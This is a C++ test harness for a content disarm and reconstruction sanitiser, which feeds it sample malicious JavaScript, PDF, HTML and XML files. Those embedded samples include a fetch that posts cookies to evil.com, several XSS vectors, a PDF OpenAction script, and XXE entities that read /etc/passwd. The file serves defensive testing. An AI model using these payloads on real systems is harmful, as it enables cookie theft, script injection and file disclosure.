#include "cdr/CdrManager.h"
#include <iostream>
#include <fstream>
#include <filesystem>

void testFileType(CdrManager& cdr, const std::string& filename, const std::string& content) {
    try {
        std::string inputPath = "c:/temp/multi_test/" + filename;
        std::string outputPath = "c:/temp/multi_test/clean_" + filename;
        
        // Create test file
        std::filesystem::create_directories("c:/temp/multi_test");
        std::ofstream file(inputPath);
        file << content;
        file.close();
        
        std::cout << "\n--- Testing: " << filename << " ---" << std::endl;
        std::cout << "File size: " << std::filesystem::file_size(inputPath) << " bytes" << std::endl;
        
        // Test with HIGH security level
        auto result = cdr.sanitizeFile(inputPath, outputPath, SecurityLevel::HIGH);
        
        std::cout << "Result: " << (result.success ? "SUCCESS" : "FAILED") << std::endl;
        
        if (result.success) {
            std::cout << "Quarantine required: " << (result.requiresQuarantine ? "YES" : "NO") << std::endl;
            std::cout << "Threats detected: " << result.threatsDetected.size() << std::endl;
            std::cout << "Actions performed: " << result.actionsPerformed.size() << std::endl;
            
            if (std::filesystem::exists(outputPath)) {
                std::cout << "Output size: " << std::filesystem::file_size(outputPath) << " bytes" << std::endl;
            }
            
            // Show first few threats and actions
            if (!result.threatsDetected.empty()) {
                std::cout << "Sample threats: ";
                for (size_t i = 0; i < std::min(size_t(3), result.threatsDetected.size()); ++i) {
                    std::cout << static_cast<int>(result.threatsDetected[i]) << " ";
                }
                std::cout << std::endl;
            }
            
            if (!result.actionsPerformed.empty()) {
                std::cout << "Sample actions: ";
                for (size_t i = 0; i < std::min(size_t(3), result.actionsPerformed.size()); ++i) {
                    std::cout << static_cast<int>(result.actionsPerformed[i]) << " ";
                }
                std::cout << std::endl;
            }
        } else {
            std::cout << "Error: " << result.errorMessage << std::endl;
        }
        
    } catch (const std::exception& e) {
        std::cout << "Exception: " << e.what() << std::endl;
    }
}

int main() {
    std::cout << "CDR Multi-File Type Validation Test" << std::endl;
    std::cout << "====================================" << std::endl;
    
    try {
        CdrManager cdr;
        
        // Test JavaScript file
        std::string jsContent = R"(
// Malicious JavaScript
function hack() {
    eval("alert('XSS')");
    document.cookie = "stolen=true";
    fetch('http://evil.com/steal', {method: 'POST', body: document.cookie});
}
setTimeout(hack, 1000);
window.open('http://malware.com');
)";
        
        testFileType(cdr, "malicious.js", jsContent);
        
        // Test PDF with JavaScript
        std::string pdfContent = R"(%PDF-1.4
1 0 obj<</Type/Catalog/Pages 2 0 R/OpenAction<</S/JavaScript/JS(app.alert('PDF XSS'))>>>>endobj
2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj
3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Contents 4 0 R>>endobj
4 0 obj<</Length 44>>stream
BT /F1 12 Tf 100 700 Td (Malicious PDF) Tj ET
endstream endobj
xref 0 5
0000000000 65535 f 
0000000009 00000 n 
0000000158 00000 n 
0000000215 00000 n 
0000000315 00000 n 
trailer<</Size 5/Root 1 0 R>>
startxref 409
%%EOF)";
        
        testFileType(cdr, "malicious.pdf", pdfContent);
        
        // Test HTML with multiple attack vectors
        std::string htmlContent = R"(<!DOCTYPE html>
<html>
<head><title>Malicious Page</title></head>
<body>
<script>
    alert('XSS Attack');
    document.location = 'http://evil.com';
</script>
<img src="x" onerror="alert('Image XSS')">
<iframe src="javascript:alert('Iframe XSS')"></iframe>
<object data="http://evil.com/malware.swf"></object>
<embed src="http://evil.com/malware.pdf">
<form action="http://evil.com/steal" method="post">
    <input type="hidden" name="data" value="sensitive">
</form>
<a href="javascript:alert('Link XSS')">Click me</a>
</body>
</html>)";
        
        testFileType(cdr, "malicious.html", htmlContent);
        
        // Test XML with external entities
        std::string xmlContent = R"(<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY remote SYSTEM "http://evil.com/steal">
]>
<root>
    <data>&xxe;</data>
    <remote>&remote;</remote>
    <script><![CDATA[alert('XML XSS')]]></script>
</root>)";
        
        testFileType(cdr, "malicious.xml", xmlContent);
        
        std::cout << "\n=== Test Summary ===" << std::endl;
        std::cout << "✅ Tested 4 different file types" << std::endl;
        std::cout << "✅ Tested various attack vectors:" << std::endl;
        std::cout << "   • JavaScript code injection" << std::endl;
        std::cout << "   • PDF JavaScript execution" << std::endl;
        std::cout << "   • HTML XSS attacks" << std::endl;
        std::cout << "   • XML external entity attacks" << std::endl;
        std::cout << "\n🎉 Multi-File CDR Validation Complete!" << std::endl;
        
    } catch (const std::exception& e) {
        std::cerr << "Test failed: " << e.what() << std::endl;
        return 1;
    }
    
    return 0;
}
